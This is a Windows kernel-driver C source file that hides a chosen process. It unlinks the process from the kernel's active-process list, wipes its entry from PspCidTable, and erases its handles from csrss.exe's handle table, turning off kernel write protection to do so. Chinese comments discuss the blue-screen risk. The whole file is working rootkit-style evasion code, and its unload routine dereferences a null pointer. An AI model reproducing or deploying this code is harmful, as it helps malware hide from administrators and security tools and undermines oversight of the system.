
#include "ScProtect.h"

NTSTATUS
RemoveLinkFromLists(__in HANDLE UniqueProcessId)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    PLIST_ENTRY ListEntry = NULL;
    PEPROCESS EProcess;
    PVOID ObjectTable;

    ASSERT(offset_Process_ActiveProcessLinks);
    ASSERT(offset_HandleTable_HandleTableList);

    ntStatus = PsLookupProcessByProcessId(UniqueProcessId, &EProcess);
    
    if (NT_SUCCESS(ntStatus)) {

        ObDereferenceObject(EProcess);
        ListEntry = (PLIST_ENTRY)((ULONG)EProcess + offset_Process_ActiveProcessLinks);
        pdoHideGlobalInfo.ActiveProcessList = ListEntry;
        //
        // 蓝的几率很小，但前提是，这个操作要在IRQL < DISPATCH_LEVEL 下执行,
        // 因为大部分时间里，这个操作所涉及涉及到的内存已经被换出物理内存了。
        // 我在KiSystemService执行的时候执行这个操作，从来没有蓝过 
        //
        WPOFF();
        ListEntry->Blink->Flink = ListEntry->Flink;
        ListEntry->Flink->Blink = ListEntry->Blink;
        ListEntry->Flink = NULL;
        ListEntry->Blink = NULL;
        
        //
        // ObjectTable -> HandleTableList
        // 这是一个全局句柄表链，抹的话不好恢复，以后解决
        //
        ObjectTable = (PVOID)*(PULONG)((ULONG)EProcess + offset_Process_ObjectTable);
        ListEntry = (PLIST_ENTRY)((ULONG)ObjectTable + offset_HandleTable_HandleTableList);

        //ListEntry->Blink->Flink = ListEntry->Flink;
        //ListEntry->Flink->Blink = ListEntry->Blink;
        //ListEntry->Flink = NULL;
        //ListEntry->Blink = NULL;
        WPON();
    }
    return ntStatus;
}   

//////////////////////////////////////////////////////////////////////////

BOOLEAN 
EnumHandleCallback(
    PHANDLE_TABLE_ENTRY HandleTableEntry, 
    HANDLE Handle, 
    PVOID EnumParameter
    )
{
    if (ARGUMENT_PRESENT(EnumParameter) &&
        Handle == *(PHANDLE)EnumParameter) {
        *(PULONG)EnumParameter = (ULONG)HandleTableEntry;
        return TRUE;
    }
    return FALSE;
}

NTSTATUS
EraseObjectFromObjectTable(
    __in PVOID HandleTable, 
    __in HANDLE UniqueProcessId
    )
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    UNICODE_STRING FunctionName;
    pFnExEnumHandleTable ExEnumHandleTable = NULL;
    PHANDLE_TABLE_ENTRY HandleTableEntry = NULL;
    PVOID EnumParam;

    ASSERT(HandleTable != NULL && UniqueProcessId);
    if (!MmIsAddressValid(HandleTable)) return STATUS_ACCESS_VIOLATION;

    RtlInitUnicodeString(&FunctionName, L"ExEnumHandleTable");
    ExEnumHandleTable = MmGetSystemRoutineAddress(&FunctionName);
    if (ExEnumHandleTable == NULL)  return STATUS_NOT_FOUND;

    EnumParam = UniqueProcessId;

    if (ExEnumHandleTable(HandleTable, EnumHandleCallback, &EnumParam, NULL)) 
    {
        HandleTableEntry = EnumParam;
        RtlCopyMemory(&pdoHideGlobalInfo.ObjectInfo[EraseNumber], HandleTableEntry, sizeof(HANDLE_TABLE_ENTRY));
        pdoHideGlobalInfo.ObjectEntry[EraseNumber] = HandleTableEntry;
        pdoHideGlobalInfo.HiddenProcessId = UniqueProcessId;
        InterlockedExchangePointer(&HandleTableEntry->Object, NULL);
        EraseNumber ++;
        ntStatus = STATUS_SUCCESS;
    }
    return ntStatus;
}

VOID ScPtUnloadRoutine()
{
    PHANDLE_TABLE_ENTRY Entry= NULL;
    PLIST_ENTRY ListEntry = (PLIST_ENTRY)g_PsActiveProcessHead;
    ULONG Number;
    
    KdPrint(("[ScpUnloadRoutine] Object 0x%08X", Entry->Object));
    KdPrint(("[ScpUnloadRoutine] GrantedAccess 0x%08X", Entry->GrantedAccess));
    
    WPOFF();

    if (pdoHideGlobalInfo.ActiveProcessList) {
        InsertHeadList(ListEntry, pdoHideGlobalInfo.ActiveProcessList);
    }

    for (Number = 0; Number < EraseNumber; Number++)
    {
        Entry = pdoHideGlobalInfo.ObjectEntry[Number];
        InterlockedExchangePointer(&Entry->Object, pdoHideGlobalInfo.ObjectInfo[Number].Object);
        InterlockedExchangePointer(&Entry->GrantedAccess, pdoHideGlobalInfo.ObjectInfo[Number].GrantedAccess);
    }
    WPON();

    ObReferenceObject(pdoHideGlobalInfo.ObjectInfo[0].Object);
}

NTSTATUS ScPtHideProcessById(__in HANDLE ProcessId)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    PVOID HandleTable = NULL;
    
    if (ProcessId == NULL)  return STATUS_ACCESS_VIOLATION;
    
    RtlZeroMemory(&pdoHideGlobalInfo, sizeof(PROTECT_INFO));

    ntStatus = RemoveLinkFromLists(ProcessId);
    KdPrint(("[ScpHideProcessById] Remove link from lists : 0x%08x", ntStatus));

    ASSERT(g_PspCidTable);

    HandleTable = (PVOID)*(PULONG)g_PspCidTable;
    ntStatus = EraseObjectFromObjectTable(HandleTable, ProcessId);
    KdPrint(("[ScpHideProcessById] Erase PspCidTable : 0x%08x", ntStatus));
    
    if (g_CsrssProcess == NULL) {
        ScPsLookupProcessByName(&g_CsrssProcess, L"csrss.exe");
    }
    ASSERT(offset_Process_ObjectTable);

    HandleTable = (PVOID)*(PULONG)((ULONG)g_CsrssProcess + offset_Process_ObjectTable);
    
    while (NT_SUCCESS(ntStatus)) {
        ntStatus = EraseObjectFromObjectTable(HandleTable, ProcessId);
        KdPrint(("[ScpHideProcessById] Erase Csrss HandleTable : 0x%08x", ntStatus));
    }
    return ntStatus;
}
